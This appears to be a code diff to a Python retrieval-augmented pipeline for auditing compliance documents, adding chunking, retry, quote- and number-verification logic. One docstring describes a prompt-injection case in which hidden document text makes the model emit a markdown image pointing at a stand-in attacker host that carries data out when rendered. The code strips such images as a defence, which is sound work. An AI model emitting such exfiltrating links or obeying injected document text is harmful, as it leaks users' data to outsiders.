@@ -1,8 +1,8 @@
 """
-Compliance Copilot — the RAG pipeline.
+The shared RAG pipeline - every page in the app builds on these stages.
 
 Deliberately free of Streamlit imports so the whole pipeline can be exercised
-from a plain script (see test_rag.py). app.py is only the UI layer.
+from a plain script (see tests/test_rag.py). views/ is only the UI layer.
 
 Pipeline stages, in order:
     parse_document   -> page-aware plain text
@@ -19,6 +19,7 @@ import logging
 import os
 import re
 import tempfile
+import unicodedata
 from dataclasses import dataclass, field
 from pathlib import Path
 
@@ -96,12 +97,62 @@ def _normalise_whitespace(text: str) -> str:
     every line to the same width. Left alone that padding gets embedded along
     with the words, wasting tokens and diluting the semantic signal of the
     chunk. Paragraph breaks are preserved because the chunker splits on them.
+
+    NFKC first: typeset PDFs store "fi"/"fl" as single ligature glyphs (the
+    World Bank report has 1,559 of them). Left in, "conﬂict" and "conflict"
+    are different strings to keyword search, the embedder and the quote
+    check alike. NFKC also turns non-breaking spaces into plain ones.
     """
-    text = text.replace("\xa0", " ")           # non-breaking space -> space
+    text = unicodedata.normalize("NFKC", text)  # ligatures, nbsp, full-width
     text = re.sub(r"[ \t]{2,}", " ", text)      # runs of spaces/tabs -> one
     text = re.sub(r" *\n *", "\n", text)        # strip space around newlines
     text = re.sub(r"\n{3,}", "\n\n", text)      # 3+ blank lines -> paragraph gap
     return text.strip()
+
+
+_BARE_PAGE_NUMBER = re.compile(r"^\s*(\d{1,4}|[ivxlc]{1,7})\s*$")
+
+
+def _furniture_key(line: str) -> str:
+    # Digits and spacing removed, so "3U.S. GOVERNMENT..." and the
+    # letter-spaced "C H A PT ER 2 ... 74" on every page reduce to one key.
+    return re.sub(r"[\d\s]+", "", line).lower()
+
+
+def strip_page_furniture(
+    pages: list[tuple[int | None, str]],
+    min_share: float = 0.15,
+    min_pages: int = 3,
+) -> list[tuple[int | None, str]]:
+    """
+    Remove running headers, footers and bare page numbers.
+
+    A line is furniture when (digits and spacing ignored) it appears on at
+    least `min_share` of the pages. Left in, "U.S. GOVERNMENT PUBLISHING
+    OFFICE | 2018 ANNUAL REPORT" is embedded into every chunk on 14 pages of
+    the GPO report and pulls them all towards any question that mentions GPO.
+    Short keys are kept: a table's year header ("2023 2024 2025e ...")
+    repeats on every table page and is content, not furniture.
+    """
+    from collections import Counter
+
+    counts = Counter(
+        key for _, text in pages
+        for key in {_furniture_key(line) for line in text.splitlines()} if key
+    )
+    threshold = max(min_pages, min_share * len(pages))
+    furniture = {key for key, n in counts.items() if n >= threshold and len(key) >= 8}
+
+    out = []
+    for page, text in pages:
+        kept = [
+            line for line in text.splitlines()
+            if _furniture_key(line) not in furniture and not _BARE_PAGE_NUMBER.match(line)
+        ]
+        cleaned = "\n".join(kept).strip()
+        if cleaned:
+            out.append((page, cleaned))
+    return out
 
 
 def _parse_pdf(data: bytes) -> list[tuple[int, str]]:
@@ -110,7 +161,7 @@ def _parse_pdf(data: bytes) -> list[tuple[int, str]]:
 
     try:
         reader = PdfReader(io.BytesIO(data))
-        pages = list(enumerate(reader.pages, start=1))
+        list(reader.pages)   # load the page tree here, so a corrupt file fails inside the try
     except (PyPdfError, DependencyError) as exc:
         # pypdf raises a family of low-level errors: PyPdfError is the base
         # for most (PdfStreamError, WrongPasswordError, EmptyFileError...) but
@@ -134,6 +185,8 @@ def _parse_pdf(data: bytes) -> list[tuple[int, str]]:
 
 
 def _parse_docx(data: bytes) -> str:
+    import zipfile
+
     import docx2txt
 
     # docx2txt only accepts a path, not bytes, so the upload has to touch disk.
@@ -142,6 +195,14 @@ def _parse_docx(data: bytes) -> str:
         tmp_path = tmp.name
     try:
         return docx2txt.process(tmp_path) or ""
+    except (zipfile.BadZipFile, KeyError) as exc:
+        # A corrupt file, or an old binary .doc renamed to .docx, is not a
+        # zip / has no word/document.xml. Uncaught, it crashed the whole page
+        # and took every other file in the upload batch down with it.
+        raise UnsupportedFile(
+            f"This .docx could not be read ({type(exc).__name__}). It may be "
+            f"corrupt, or an old .doc file - re-save it as .docx."
+        ) from exc
     finally:
         os.unlink(tmp_path)
 
@@ -202,92 +263,103 @@ def chunk_pages(
 
 
 # ---------------------------------------------------------------------------
-# 3. THE CHECKLIST (questions come from a preset, or from an uploaded file)
+# 3. STRUCTURE-AWARE CHUNKING
 # ---------------------------------------------------------------------------
 
-# Presets exist so the app is demoable in one click without hunting for a
-# questionnaire PDF. Upload mode is the general-purpose path.
-PRESETS: dict[str, list[str]] = {
-    "Vendor Security Assessment (12 questions)": [
-        "Is customer data encrypted at rest? State the algorithm used.",
-        "Is data encrypted in transit? State the minimum TLS version supported.",
-        "Do you enforce multi-factor authentication for administrative access?",
-        "What is the Recovery Time Objective (RTO) in a disaster recovery scenario?",
-        "How long are security audit logs retained?",
-        "What is the process for revoking access when an employee leaves?",
-        "Is the organisation certified against ISO 27001?",
-        "Is independent third-party penetration testing performed at least annually?",
-        "In which geographic regions is customer data stored?",
-        "Is cyber liability insurance carried? State the coverage limit.",
-        "Is production data ever used in non-production environments?",
-        "How are application secrets and API keys managed?",
-    ],
-    "GDPR Readiness (8 questions)": [
-        "Is a Data Protection Officer appointed, and how can they be contacted?",
-        "What is the lawful basis for processing personal data?",
-        "How can a data subject exercise their right of access?",
-        "How can a data subject request erasure of their personal data?",
-        "What is the personal data breach notification timeline to the supervisory authority?",
-        "Is a record of processing activities maintained?",
-        "Is personal data transferred outside the EEA, and under what safeguard?",
-        "How long is personal data retained, and what triggers deletion?",
-    ],
-    "SaaS Due Diligence (10 questions)": [
-        "What uptime or availability level is committed to in the SLA?",
-        "What is the Recovery Point Objective (RPO) for customer data?",
-        "How frequently are backups taken and how long are they retained?",
-        "Is the platform single-tenant or multi-tenant, and how is tenant data isolated?",
-        "Which third-party subprocessors have access to customer data?",
-        "What is the notice period for terminating the contract?",
-        "What happens to customer data on contract termination?",
-        "Is there a documented incident response plan?",
-        "What authentication methods are supported for end users?",
-        "Is there an audited compliance certification such as SOC 2 or ISO 27001?",
-    ],
-}
-
-# A questionnaire line is treated as a question if it looks like one. Used as a
-# cheap pre-filter before the LLM extraction pass, and as the fallback if that
-# pass fails.
-_QUESTION_LINE = re.compile(
-    r"""^\s*
-        (?:\(?\d+[.)]|\d+\.\d+|[-*•]|[a-zA-Z][.)])?   # optional bullet/number
-        \s*(?P<body>\S.*?)\s*$
-    """,
-    re.VERBOSE,
+# Policies, contracts and standards are written as numbered sections with
+# SHOUTED headings ("5. LOGGING AND MONITORING"). A fixed-size splitter
+# ignores that structure and produces chunks that straddle two topics: the
+# chunk answering "how long are logs kept" opened with the password heading,
+# which both blurs its embedding and makes the citation confusing to read.
+#
+# Matching only top-level ALL-CAPS headings is deliberate. Splitting on every
+# numbered clause ("2.1 ...") too would shred the document into single
+# sentences that retrieve without any surrounding context.
+#
+# [ \t], never \s: \s also matches newlines, so a page number on its own line
+# glued itself to the next line ("19\nSECT" on the GPO report) and became a
+# bogus heading.
+_SECTION_HEADING = re.compile(
+    r"^[ \t]*(\d+)\.?[ \t]+([A-Z][A-Z0-9 ,&/()'-]{3,})[ \t]*$",
+    re.MULTILINE,
 )
 
 
-def extract_questions_heuristic(text: str, min_len: int = 15) -> list[str]:
+def split_into_sections(text: str) -> list[tuple[str | None, str]]:
     """
-    Pull questions out of raw questionnaire text without calling the LLM.
+    Split a document at its top-level headings.
 
-    Keeps lines that either end in '?' or start with a numbered/bulleted
-    marker and read as an instruction ("Describe...", "State..."). This is the
-    fallback path — extract_questions() prefers the LLM, which handles
-    questions that wrap across several lines.
+    Returns [(heading, body), ...]. Any preamble before the first heading is
+    returned with heading None. A document with no detectable headings comes
+    back as a single (None, text) entry, so callers need no special case.
     """
-    imperative = (
-        "describe", "state", "explain", "list", "confirm", "provide",
-        "detail", "specify", "outline", "identify",
+    matches = list(_SECTION_HEADING.finditer(text))
+    if not matches:
+        return [(None, text)]
+
+    sections: list[tuple[str | None, str]] = []
+    if matches[0].start() > 0:
+        preamble = text[: matches[0].start()].strip()
+        if preamble:
+            sections.append((None, preamble))
+
+    for i, m in enumerate(matches):
+        heading = m.group(0).strip()
+        end = matches[i + 1].start() if i + 1 < len(matches) else len(text)
+        body = text[m.end() : end].strip()
+        if body:
+            sections.append((heading, body))
+    return sections
+
+
+def chunk_pages_structured(
+    pages: list[tuple[int | None, str]],
+    source: str,
+    chunk_size: int = CHUNK_SIZE,
+    chunk_overlap: int = CHUNK_OVERLAP,
+) -> list[Document]:
+    """
+    Chunk on section boundaries, falling back to size-based splitting.
+
+    A section that already fits becomes exactly one chunk - one topic, one
+    embedding. An oversized section is split further, and every resulting
+    piece is PREFIXED WITH ITS HEADING so a fragment of section 5 still
+    carries "5. LOGGING AND MONITORING" into both the embedding and the
+    citation. That prefix is why a mid-section fragment stays interpretable.
+    """
+    splitter = RecursiveCharacterTextSplitter(
+        chunk_size=chunk_size,
+        chunk_overlap=chunk_overlap,
+        separators=["\n\n", "\n", ". ", " ", ""],
+        length_function=len,
     )
-    out: list[str] = []
-    for raw in text.splitlines():
-        m = _QUESTION_LINE.match(raw)
-        if not m:
-            continue
-        body = m.group("body").strip()
-        if len(body) < min_len:
-            continue
-        # A '?' ANYWHERE in the line, not just at the end. Real
-        # questionnaires constantly write "Is data encrypted at rest? State
-        # the algorithm used." — testing only endswith('?') drops every one of
-        # those, and silently dropping a question means silently hiding a gap.
-        looks_like_question = "?" in body or body.lower().startswith(imperative)
-        if looks_like_question:
-            out.append(body)
-    # Preserve order, drop duplicates.
-    return list(dict.fromkeys(out))
+
+    docs: list[Document] = []
+    for page, text in pages:
+        for heading, body in split_into_sections(text):
+            prefix = f"{heading}\n" if heading else ""
+            whole = f"{prefix}{body}"
+
+            pieces = [whole] if len(whole) <= chunk_size else [
+                # Re-prefix each piece; the splitter only sees the body.
+                f"{prefix}{piece}" for piece in splitter.split_text(body)
+            ]
+            for piece in pieces:
+                piece = piece.strip()
+                if not piece:
+                    continue
+                docs.append(
+                    Document(
+                        page_content=piece,
+                        metadata={
+                            "source": source,
+                            "page": page if page is not None else 0,
+                            "section": heading or "",
+                            "chunk_index": len(docs),
+                        },
+                    )
+                )
+    return docs
 
 
 # ---------------------------------------------------------------------------
@@ -299,6 +371,10 @@ def extract_questions_heuristic(text: str, min_len: int = 15) -> list[str]:
 COVERED = "COVERED"
 PARTIAL = "PARTIAL"
 NOT_FOUND = "NOT_FOUND"
+# The question could not be processed at all (API down, quota exhausted).
+# Deliberately NOT a NOT_FOUND: that would tell the user "your documents don't
+# answer this" when the documents were never checked.
+ERROR = "ERROR"
 
 
 @dataclass
@@ -306,27 +382,44 @@ class Citation:
     source: str
     page: int          # 0 means "document has no pages" (docx/txt)
     quote: str         # verbatim span from the chunk, verified to exist
-    # Cosine DISTANCE, not a similarity score: LOWER means a closer match.
+    # A DISTANCE, not a similarity score: LOWER means a closer match.
     # Chroma's method is named "..._with_relevance_scores" but returns raw
-    # distances, so anything that sorts or thresholds on this must not assume
-    # the usual higher-is-better convention.
+    # distances (L2 by default), so anything that sorts or thresholds on this
+    # must not assume the usual higher-is-better convention.
     distance: float
+    section: str = ""       # where in the document's structure, if known
+    printed_page: str = ""  # the number printed on the page, if it differs
 
     def label(self) -> str:
-        return f"{self.source}, p.{self.page}" if self.page else self.source
+        label = f"{self.source}, p.{self.page}" if self.page else self.source
+        if self.printed_page and self.printed_page != str(self.page):
+            label += f" (printed {self.printed_page})"
+        return f"{label} · {self.section}" if self.section else label
+
+
+def context_label(meta: dict) -> str:
+    """The bracketed label a chunk carries into the prompt: source, page, section."""
+    return Citation(
+        source=meta.get("source", "?"),
+        page=int(meta.get("page") or 0),
+        quote="",
+        distance=0.0,
+        section=meta.get("section", ""),
+        printed_page=str(meta.get("printed_page", "")),
+    ).label()
 
 
 @dataclass
 class Finding:
     question: str
-    verdict: str                              # COVERED | PARTIAL | NOT_FOUND
+    verdict: str                              # COVERED | PARTIAL | NOT_FOUND | ERROR
     answer: str
     citations: list[Citation] = field(default_factory=list)
     note: str = ""                            # why a verdict was downgraded
 
     @property
     def icon(self) -> str:
-        return {COVERED: "✅", PARTIAL: "⚠️", NOT_FOUND: "❌"}[self.verdict]
+        return {COVERED: "✅", PARTIAL: "⚠️", NOT_FOUND: "❌", ERROR: "🛑"}[self.verdict]
 
 
 # ---------------------------------------------------------------------------
@@ -340,15 +433,19 @@ class Finding:
 CHAT_PREFERENCE = [
     "gemini-3.1-flash-lite",   # measured ~5x faster than 3.x flash on this task
     "gemini-3.5-flash-lite",
+    "gemini-flash-lite-latest",
     "gemini-2.5-flash-lite",
     "gemini-3.8-flash",
     "gemini-3.5-flash",
     "gemini-2.5-flash",
     "gemini-flash-latest",
 ]
+# The GA model first: on the free tier gemini-embedding-2 ran out of daily
+# quota after a few hundred texts (every text in a batch counts as a request),
+# which broke indexing for the whole day.
 EMBED_PREFERENCE = [
-    "gemini-embedding-2",
     "gemini-embedding-001",
+    "gemini-embedding-2",
 ]
 
 
@@ -399,7 +496,11 @@ def resolve_models(api_key: str) -> tuple[str, str]:
     usable model, which is a far better failure than a 404 on first query.
     """
     gen, emb = list_available_models(api_key)
-    chat = next((m for m in CHAT_PREFERENCE if m in gen), None)
+    # GEMINI_CHAT_MODEL pins the answer model - for an evaluation that must
+    # score every variant with ONE model, or when the preferred model's daily
+    # free quota (500 requests for gemini-3.1-flash-lite) is spent.
+    pinned = os.environ.get("GEMINI_CHAT_MODEL", "").strip()
+    chat = pinned if pinned in gen else next((m for m in CHAT_PREFERENCE if m in gen), None)
     embed = next((m for m in EMBED_PREFERENCE if m in emb), None)
     if not chat:
         raise RuntimeError(
@@ -415,7 +516,38 @@ def resolve_models(api_key: str) -> tuple[str, str]:
 
 
 # ---------------------------------------------------------------------------
-# 6. EMBEDDING + VECTOR STORAGE
+# 6. RETRY ON TRANSIENT ERRORS
+# ---------------------------------------------------------------------------
+
+# Rate limits (429) on free-tier keys, plus Gemini's frequent 503 "model is
+# overloaded". Both clear up on their own; anything else is a real error and
+# is raised immediately.
+_TRANSIENT_MARKERS = ("429", "resource_exhausted", "resourceexhausted",
+                      "quota", "rate limit", "too many requests",
+                      "503", "unavailable", "overloaded")
+
+
+def with_retry(fn, attempts: int = 4, base_delay: float = 2.0):
+    """Retry a call through transient API errors with exponential backoff."""
+    import time
+
+    for attempt in range(attempts):
+        try:
+            return fn()
+        except Exception as exc:
+            message = f"{type(exc).__name__} {exc}".lower()
+            # A DAILY quota ("...PerDayPerProjectPerModel...") is also a 429,
+            # but waiting seconds cannot clear it - fail now so the caller can
+            # fall back to another model instead of burning the retries.
+            transient = any(m in message for m in _TRANSIENT_MARKERS) and "perday" not in message
+            if not transient or attempt == attempts - 1:
+                raise
+            time.sleep(base_delay * (2 ** attempt))
+    raise RuntimeError("unreachable")
+
+
+# ---------------------------------------------------------------------------
+# 7. EMBEDDING + VECTOR STORAGE
 # ---------------------------------------------------------------------------
 
 # Gemini's embedding models are ASYMMETRIC: they accept a task_type telling
@@ -475,7 +607,7 @@ def build_index(
         # Unretried it surfaces as a bare "Indexing failed" and the user loses
         # the whole upload - which is exactly how this was found: as a
         # flaky test that failed only on longer runs.
-        _with_retry(lambda: store.add_documents(docs))
+        with_retry(lambda: store.add_documents(docs))
     return store
 
 
@@ -568,7 +700,7 @@ def prune_collections(
 
 
 # ---------------------------------------------------------------------------
-# 7. RETRIEVAL
+# 8. RETRIEVAL
 # ---------------------------------------------------------------------------
 
 TOP_K = 5
@@ -585,19 +717,19 @@ def retrieve(
     Find the k chunks most relevant to one question.
 
     The query is embedded separately (RETRIEVAL_QUERY) rather than reusing the
-    store's document embedder, then matched by vector. Scores are LangChain
-    relevance scores: higher is more similar.
+    store's document embedder, then matched by vector. Despite the method's
+    name, the scores are Chroma DISTANCES: lower is more similar.
     """
     # Retried here rather than only in run_audit, so the chat path and any
     # direct caller get the same protection.
-    query_vec = _with_retry(
+    query_vec = with_retry(
         lambda: make_embeddings(embed_model, TASK_QUERY, api_key).embed_query(question)
     )
     return store.similarity_search_by_vector_with_relevance_scores(query_vec, k=k)
 
 
 # ---------------------------------------------------------------------------
-# 8. GROUNDED GENERATION + THE QUOTE-VERIFICATION GUARDRAIL
+# 9. GROUNDED GENERATION + THE QUOTE-VERIFICATION GUARDRAIL
 # ---------------------------------------------------------------------------
 
 AUDIT_PROMPT = """You are auditing a set of documents to decide whether they \
@@ -630,6 +762,8 @@ reviewer needs to know it exists.
 Never paraphrase, summarise, correct or reformat a quote.
 - A verdict of COVERED or PARTIAL REQUIRES at least one verbatim quote. If you \
 cannot produce one, the verdict is NOT_FOUND.
+- Every number in your answer must appear inside one of your quotes. Quote \
+each sentence you take a figure from.
 - Do not infer an answer from a related topic. "We encrypt in transit" does \
 not answer a question about encryption at rest.
 
@@ -640,9 +774,52 @@ Question: {question}
 """
 
 
+# Characters a model "helpfully" swaps when it copies a quote - curly quotes
+# and apostrophes, en/em dashes. Same quote, different bytes; without folding
+# a genuine quote fails the check and a covered question reads as a gap.
+_QUOTE_FOLD = str.maketrans({
+    "‘": "'", "’": "'", "“": '"', "”": '"',
+    "–": "-", "—": "-",
+})
+
+
 def _normalise_for_match(text: str) -> str:
     """Fold away the differences a model harmlessly introduces when quoting."""
+    text = unicodedata.normalize("NFKC", text).translate(_QUOTE_FOLD)
     return re.sub(r"\s+", " ", text).strip().lower()
+
+
+_NUMBER = re.compile(r"\d[\d,]*(?:\.\d+)?")
+
+
+_YEAR_RANGE = re.compile(r"\b(\d{2})(\d{2})\s*[-–/]\s*(\d{2})\b")
+
+
+def _numbers(text: str) -> set[str]:
+    """
+    Every number in the text, with thousands separators dropped.
+
+    "2027-28" also yields 2028, so an answer that writes the range out in
+    full ("2027-2028") is not mistaken for an invented figure.
+    """
+    found = {n.replace(",", "") for n in _NUMBER.findall(text)}
+    found |= {century + end for century, _, end in _YEAR_RANGE.findall(text)}
+    return found
+
+
+_MD_IMAGE = re.compile(r"!\[[^\]]*\]\([^)]*\)")
+
+
+def _strip_images(text: str) -> str:
+    """
+    Remove markdown images from model output.
+
+    The UI renders answers as markdown, and an image loads the moment it
+    renders. A prompt injection hidden in an uploaded document or a client's
+    questionnaire could make the model emit ![](https://attacker/?d=<text>),
+    and the browser would send that text away without anyone clicking.
+    """
+    return _MD_IMAGE.sub("", text)
 
 
 def _extract_json(raw: str) -> dict:
@@ -660,10 +837,21 @@ def _extract_json(raw: str) -> dict:
     return json.loads(raw[start : end + 1])
 
 
+REPAIR_PROMPT = """
+
+Your previous reply was rejected by an automatic check: {problem}
+Reply again in the same JSON format. Copy every quote character-for-character \
+from one passage, quote every passage (sentence or table row) that a number in \
+your answer comes from - or leave that number out - and report figures exactly \
+as printed."""
+
+
 def answer_question(
     llm,
     question: str,
     hits: list[tuple[Document, float]],
+    prompt: str = AUDIT_PROMPT,
+    repair: bool = False,
 ) -> Finding:
     """
     Answer one question from retrieved chunks, then VERIFY the answer.
@@ -676,7 +864,20 @@ def answer_question(
 
     So "COVERED" never means "the model said so" - it means the supporting
     sentence was located in the user's own document. Prompt instructions alone
-    are a request; this is an check.
+    are a request; this is a check.
+
+    A real quote can still sit beside an invented answer ("7 years" next to a
+    verified "retained for 12 months"), so every number the answer states must
+    also appear in a passage it verifiably quoted from, or in the question.
+    The passage, not just the quote: a table cell's meaning lives in its
+    header ("iMac (two ports) 256GB"), which a model rarely quotes even when
+    told to, and a number that sits in the quoted passage is in the document
+    right beside the evidence.
+
+    repair=True gives a rejected reply ONE second chance: the model is told
+    exactly why it was rejected and answers again, and the new reply goes
+    through the same checks. The check never relaxes; the model gets the
+    feedback a human reviewer would give. One extra call, only on rejection.
     """
     if not hits:
         return Finding(
@@ -687,14 +888,29 @@ def answer_question(
         )
 
     context = "\n\n".join(
-        f"[{i}] ({doc.metadata.get('source', '?')}"
-        + (f", p.{doc.metadata['page']}" if doc.metadata.get("page") else "")
-        + f")\n{doc.page_content}"
+        f"[{i}] ({context_label(doc.metadata)})\n{doc.page_content}"
         for i, (doc, _) in enumerate(hits, start=1)
     )
 
-    raw = get_text(llm.invoke(AUDIT_PROMPT.format(context=context, question=question)))
+    full_prompt = prompt.format(context=context, question=question)
+    finding = _verify(get_text(llm.invoke(full_prompt)), question, hits)
+    rejected = finding.note.startswith(("Downgraded", "Could not parse"))
+    if not (repair and rejected):
+        return finding
 
+    second = _verify(
+        get_text(llm.invoke(full_prompt + REPAIR_PROMPT.format(problem=finding.note))),
+        question, hits,
+    )
+    if second.verdict in (COVERED, PARTIAL):
+        second.note = f"Passed on a second attempt; the first reply was rejected - {finding.note} {second.note}".strip()
+    else:
+        second.note = f"{second.note} (after one repair attempt)".strip()
+    return second
+
+
+def _verify(raw: str, question: str, hits: list[tuple[Document, float]]) -> Finding:
+    """Parse a model reply and hold it to the quote and number checks."""
     try:
         payload = _extract_json(raw)
     except Exception as exc:
@@ -709,13 +925,14 @@ def answer_question(
     verdict = str(payload.get("verdict", "")).strip().upper()
     if verdict not in (COVERED, PARTIAL, NOT_FOUND):
         verdict = NOT_FOUND
-    answer = str(payload.get("answer", "")).strip()
+    answer = _strip_images(str(payload.get("answer", ""))).strip()
     claimed = payload.get("quotes") or []
     if isinstance(claimed, str):
         claimed = [claimed]
 
     # --- verification: every claimed quote must exist in a retrieved chunk ---
     citations: list[Citation] = []
+    cited_passages: list[str] = []
     unverified: list[str] = []
     for quote in claimed:
         quote = str(quote).strip()
@@ -730,18 +947,31 @@ def answer_question(
                         page=int(doc.metadata.get("page") or 0),
                         quote=quote,
                         distance=float(distance),
+                        section=doc.metadata.get("section", ""),
+                        printed_page=str(doc.metadata.get("printed_page", "")),
                     )
                 )
+                cited_passages.append(doc.page_content)
                 break
         else:
             unverified.append(quote)
 
     note = ""
+    unsupported = sorted(
+        _numbers(answer) - _numbers(" ".join(cited_passages) + " " + question)
+    )
     if verdict in (COVERED, PARTIAL) and not citations:
         note = (
             "Downgraded to NOT_FOUND: the model claimed coverage but no "
             "supporting quote could be found in the retrieved text"
             + (f" ({len(unverified)} quote(s) did not match)." if unverified else ".")
+        )
+        verdict, answer = NOT_FOUND, ""
+    elif verdict in (COVERED, PARTIAL) and unsupported:
+        # Citations are kept: they show the reviewer what WAS found.
+        note = (
+            f"Downgraded to NOT_FOUND: the answer states {', '.join(unsupported)}, "
+            f"which appears in none of the passages it quoted."
         )
         verdict, answer = NOT_FOUND, ""
     elif unverified:
@@ -757,278 +987,7 @@ def answer_question(
 
 
 # ---------------------------------------------------------------------------
-# 9. STRUCTURE-AWARE CHUNKING
-# ---------------------------------------------------------------------------
-
-# Policies, contracts and standards are written as numbered sections with
-# SHOUTED headings ("5. LOGGING AND MONITORING"). A fixed-size splitter
-# ignores that structure and produces chunks that straddle two topics: the
-# chunk answering "how long are logs kept" opened with the password heading,
-# which both blurs its embedding and makes the citation confusing to read.
-#
-# Matching only top-level ALL-CAPS headings is deliberate. Splitting on every
-# numbered clause ("2.1 ...") too would shred the document into single
-# sentences that retrieve without any surrounding context.
-_SECTION_HEADING = re.compile(
-    r"^\s*(\d+)\.?\s+([A-Z][A-Z0-9 ,&/()'-]{3,})\s*$",
-    re.MULTILINE,
-)
-
-
-def split_into_sections(text: str) -> list[tuple[str | None, str]]:
-    """
-    Split a document at its top-level headings.
-
-    Returns [(heading, body), ...]. Any preamble before the first heading is
-    returned with heading None. A document with no detectable headings comes
-    back as a single (None, text) entry, so callers need no special case.
-    """
-    matches = list(_SECTION_HEADING.finditer(text))
-    if not matches:
-        return [(None, text)]
-
-    sections: list[tuple[str | None, str]] = []
-    if matches[0].start() > 0:
-        preamble = text[: matches[0].start()].strip()
-        if preamble:
-            sections.append((None, preamble))
-
-    for i, m in enumerate(matches):
-        heading = m.group(0).strip()
-        end = matches[i + 1].start() if i + 1 < len(matches) else len(text)
-        body = text[m.end() : end].strip()
-        if body:
-            sections.append((heading, body))
-    return sections
-
-
-def chunk_pages_structured(
-    pages: list[tuple[int | None, str]],
-    source: str,
-    chunk_size: int = CHUNK_SIZE,
-    chunk_overlap: int = CHUNK_OVERLAP,
-) -> list[Document]:
-    """
-    Chunk on section boundaries, falling back to size-based splitting.
-
-    A section that already fits becomes exactly one chunk - one topic, one
-    embedding. An oversized section is split further, and every resulting
-    piece is PREFIXED WITH ITS HEADING so a fragment of section 5 still
-    carries "5. LOGGING AND MONITORING" into both the embedding and the
-    citation. That prefix is why a mid-section fragment stays interpretable.
-    """
-    splitter = RecursiveCharacterTextSplitter(
-        chunk_size=chunk_size,
-        chunk_overlap=chunk_overlap,
-        separators=["\n\n", "\n", ". ", " ", ""],
-        length_function=len,
-    )
-
-    docs: list[Document] = []
-    for page, text in pages:
-        for heading, body in split_into_sections(text):
-            prefix = f"{heading}\n" if heading else ""
-            whole = f"{prefix}{body}"
-
-            pieces = [whole] if len(whole) <= chunk_size else [
-                # Re-prefix each piece; the splitter only sees the body.
-                f"{prefix}{piece}" for piece in splitter.split_text(body)
-            ]
-            for piece in pieces:
-                piece = piece.strip()
-                if not piece:
-                    continue
-                docs.append(
-                    Document(
-                        page_content=piece,
-                        metadata={
-                            "source": source,
-                            "page": page if page is not None else 0,
-                            "section": heading or "",
-                            "chunk_index": len(docs),
-                        },
-                    )
-                )
-    return docs
-
-
-# ---------------------------------------------------------------------------
-# 10. QUESTION EXTRACTION FROM AN UPLOADED QUESTIONNAIRE
-# ---------------------------------------------------------------------------
-
-EXTRACT_PROMPT = """Below is the text of a questionnaire, assessment or \
-checklist.
-
-Extract every question or information request a respondent is expected to \
-answer. Reply with ONLY a JSON array of strings, no prose and no code fence:
-["first question", "second question"]
-
-Rules:
-- Copy each question's wording; do not rewrite or summarise it.
-- Drop the numbering or bullet marker.
-- A question split across several lines becomes ONE entry.
-- Keep any trailing instruction that is part of the request, e.g. \
-"Is data encrypted at rest? State the algorithm used."
-- Ignore headings, section titles, instructions to the assessor, and \
-signature or metadata blocks.
-
-Questionnaire text:
-{text}
-"""
-
-# Questionnaires are usually short; this cap keeps one oversized upload from
-# blowing the context window. Text beyond it falls back to the heuristic.
-_EXTRACT_CHAR_LIMIT = 24_000
-
-
-def extract_questions(text: str, llm=None) -> list[str]:
-    """
-    Pull the question list out of raw questionnaire text.
-
-    Prefers the LLM, which handles wrapped lines, tables and inconsistent
-    numbering. Falls back to the regex heuristic when there is no LLM, the
-    text is too long, or the model returns something unusable - the fallback
-    matters because a dropped question silently becomes a hidden gap.
-    """
-    if llm is None or len(text) > _EXTRACT_CHAR_LIMIT:
-        return extract_questions_heuristic(text)
-
-    try:
-        import json
-
-        raw = get_text(llm.invoke(EXTRACT_PROMPT.format(text=text)))
-        start, end = raw.find("["), raw.rfind("]")
-        if start == -1 or end == -1:
-            raise ValueError("no JSON array in reply")
-        items = json.loads(raw[start : end + 1])
-        questions = [
-            str(q).strip() for q in items if isinstance(q, (str, int, float)) and str(q).strip()
-        ]
-        questions = list(dict.fromkeys(questions))
-        if not questions:
-            raise ValueError("model returned an empty list")
-        return questions
-    except Exception:
-        return extract_questions_heuristic(text)
-
-
-# ---------------------------------------------------------------------------
-# 11. BATCH AUDIT
-# ---------------------------------------------------------------------------
-
-# Free-tier Gemini keys are rate limited per minute. Four concurrent workers
-# cuts a 12-question audit from ~48s to ~15s while staying well inside the
-# limit; _with_retry absorbs the 429s that do slip through. Without the retry
-# a long audit dies half-way and reports phantom gaps for every question that
-# never ran - which would be indistinguishable from a genuine finding.
-MAX_WORKERS = 4
-
-_RATE_LIMIT_MARKERS = ("429", "resource_exhausted", "resourceexhausted",
-                       "quota", "rate limit", "too many requests")
-
-
-def _with_retry(fn, attempts: int = 4, base_delay: float = 2.0):
-    """Retry a call through rate limiting with exponential backoff."""
-    import time
-
-    for attempt in range(attempts):
-        try:
-            return fn()
-        except Exception as exc:
-            message = f"{type(exc).__name__} {exc}".lower()
-            transient = any(m in message for m in _RATE_LIMIT_MARKERS)
-            if not transient or attempt == attempts - 1:
-                raise
-            time.sleep(base_delay * (2 ** attempt))
-    raise RuntimeError("unreachable")
-
-
-def run_audit(
-    questions: list[str],
-    store,
-    llm,
-    embed_model: str,
-    api_key: str | None = None,
-    k: int = TOP_K,
-    max_workers: int = MAX_WORKERS,
-    on_result=None,
-) -> list[Finding]:
-    """
-    Answer every question against the knowledge base.
-
-    Questions run concurrently but results are returned in the original order,
-    so the report always matches the questionnaire. A question that fails
-    outright becomes a NOT_FOUND finding carrying the error rather than
-    vanishing - a missing row would read as "not asked" instead of "broken".
-
-    on_result(index, finding) is called as each one lands, for UI progress.
-    """
-    from concurrent.futures import ThreadPoolExecutor, as_completed
-
-    results: list[Finding | None] = [None] * len(questions)
-
-    def one(index: int, question: str) -> tuple[int, Finding]:
-        try:
-            hits = _with_retry(
-                lambda: retrieve(store, question, embed_model, k=k, api_key=api_key)
-            )
-            return index, _with_retry(lambda: answer_question(llm, question, hits))
-        except Exception as exc:
-            return index, Finding(
-                question=question,
-                verdict=NOT_FOUND,
-                answer="",
-                note=f"Failed to process: {type(exc).__name__}: {exc}",
-            )
-
-    with ThreadPoolExecutor(max_workers=max_workers) as pool:
-        futures = [pool.submit(one, i, q) for i, q in enumerate(questions)]
-        for future in as_completed(futures):
-            index, finding = future.result()
-            results[index] = finding
-            if on_result:
-                on_result(index, finding)
-
-    return [f for f in results if f is not None]
-
-
-# ---------------------------------------------------------------------------
-# 12. EXPORT
-# ---------------------------------------------------------------------------
-
-
-def findings_to_csv(findings: list[Finding]) -> str:
-    """Render findings as CSV - the format a real questionnaire gets returned in."""
-    import csv
-    import io as _io
-
-    buf = _io.StringIO()
-    writer = csv.writer(buf)
-    writer.writerow(["#", "Question", "Verdict", "Answer", "Sources", "Evidence", "Note"])
-    for i, f in enumerate(findings, start=1):
-        writer.writerow([
-            i,
-            f.question,
-            f.verdict,
